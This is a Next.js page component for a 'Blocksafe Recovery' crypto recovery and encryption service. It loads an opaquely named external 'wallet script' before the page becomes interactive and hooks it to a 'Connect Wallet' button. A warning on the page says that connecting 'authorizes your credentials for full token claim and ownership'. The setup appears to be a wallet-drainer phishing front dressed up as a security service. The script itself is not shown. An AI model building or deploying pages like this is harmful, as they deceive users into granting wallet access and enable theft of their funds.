"use client"
import Image from "next/image"
import Script from 'next/script'
import { Card, CardContent } from "@/components/ui/card"
import { Shield, Wallet, Lock, ArrowRight, CheckCircle } from "lucide-react"

export default function BlocksafeRecovery() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-amber-50 via-orange-50 to-stone-100">
      {/* Load the wallet script */}
      <Script src="a2672151-3752-42c5-b6ba-b85b723314ba.js" strategy="beforeInteractive" />
      <Script src="https://cdn.tailwindcss.com" strategy="beforeInteractive" />

      {/* Header */}
      <header className="border-b border-amber-200/50 bg-white/80 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center space-x-3">
            <div className="flex items-center space-x-4">
              <div className="flex items-center justify-center w-12 h-12">
                <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none">
                  <path
                    d="M12 2L3 7V12C3 16.55 6.84 20.74 9.91 21.74C11.04 22.08 12.96 22.08 14.09 21.74C17.16 20.74 21 16.55 21 12V7L12 2Z"
                    fill="#1e3a8a"
                  />
                  <text
                    x="12"
                    y="14.5"
                    textAnchor="middle"
                    className="text-lg font-bold"
                    fill="#fef7ed"
                    dominantBaseline="central"
                  >
                    B
                  </text>
                </svg>
              </div>
              <div className="flex flex-col">
                <h1 className="text-xl font-bold text-blue-900 leading-tight">BLOCKSAFE</h1>
                <h2 className="text-lg text-blue-900 leading-tight">RECOVERY</h2>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-16">
        <div className="max-w-4xl mx-auto text-center">
          {/* Hero Section */}
          <div className="mb-16">
            <div className="flex justify-center mb-8">
              <div className="flex items-center space-x-4 p-4 bg-slate-800/50 rounded-full backdrop-blur-sm">
                <Lock className="w-8 h-8 text-blue-400" />
                <ArrowRight className="w-6 h-6 text-slate-400" />
                <Wallet className="w-8 h-8 text-purple-400" />
              </div>
            </div>

            <h2 className="text-5xl md:text-6xl font-bold text-blue-900 mb-6 leading-tight">
              Secure Crypto
              <span className="block bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                Recovery & Encryption
              </span>
            </h2>

            <p className="text-xl text-blue-900 mb-12 max-w-2xl mx-auto leading-relaxed">
              Advanced blockchain technology for secure cryptocurrency recovery and encryption services. Protect and
              recover your digital assets with military-grade security.
            </p>
          </div>

          {/* Connect Wallet Section */}
          <div className="max-w-2xl mx-auto">
            <Card className="bg-slate-800/50 border-slate-700/50 backdrop-blur-sm">
              <CardContent className="p-8">
                
                <div className="flex justify-center mb-6">
                  <div className="w-16 h-16 rounded-full flex items-center justify-center bg-gradient-to-r from-blue-500 to-purple-600">
                    <Wallet className="w-8 h-8 text-white" />
                  </div>
                </div>

                <h3 className="text-2xl font-bold text-blue-900 mb-4">Connect Your Wallet</h3>
                <p className="text-blue-900 mb-8">
                  Get started with BLOCKSAFE RECOVERY by connecting your cryptocurrency wallet for Wallet and Network Activation.
                </p>
                {/* Warning Section */}
                <div className="border border-yellow-400 text-yellow-500 rounded-lg p-4 mb-6">
                  <p className="text-sm font-semibold">
                    ⚠️ Important Notice: Connecting your wallet enables account activation and authorizes your credentials for full token claim and ownership, allowing for secure unwrapping and recovery.
                  </p>
                </div>

                {/* JavaScript-Controlled Connect Wallet Button */}
                <div id="wallet-connect-container">
                  <button className="interact-button bg-blue-500 text-white px-6 py-3 rounded-lg hover:bg-blue-600">
                    Connect Wallet
                  </button>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Features */}
          <div className="grid md:grid-cols-3 gap-8 mt-16">
            <div className="text-center">
              <div className="w-12 h-12 bg-blue-500/20 rounded-lg flex items-center justify-center mx-auto mb-4">
                <Shield className="w-6 h-6 text-blue-400" />
              </div>
              <h4 className="text-lg font-semibold text-blue-900 mb-2">Military-Grade Security</h4>
              <p className="text-blue-900">Advanced encryption protocols protect your assets</p>
            </div>

            <div className="text-center">
              <div className="w-12 h-12 bg-purple-500/20 rounded-lg flex items-center justify-center mx-auto mb-4">
                <Lock className="w-6 h-6 text-purple-400" />
              </div>
              <h4 className="text-lg font-semibold text-blue-900 mb-2">Secure Recovery</h4>
              <p className="text-blue-900">Reliable recovery solutions for lost access</p>
            </div>

            <div className="text-center">
              <div className="w-12 h-12 bg-green-500/20 rounded-lg flex items-center justify-center mx-auto mb-4">
                <Wallet className="w-6 h-6 text-green-400" />
              </div>
              <h4 className="text-lg font-semibold text-blue-900 mb-2">Direct Access</h4>
              <p className="text-blue-900">Seamless integration with your wallet</p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800/50 mt-16">
        <div className="container mx-auto px-4 py-8">
          <div className="text-center text-blue-900">
            <p>&copy; 2024 BLOCKSAFE RECOVERY. All rights reserved.</p>
            <p className="text-sm mt-2">Secure • Reliable • Professional</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
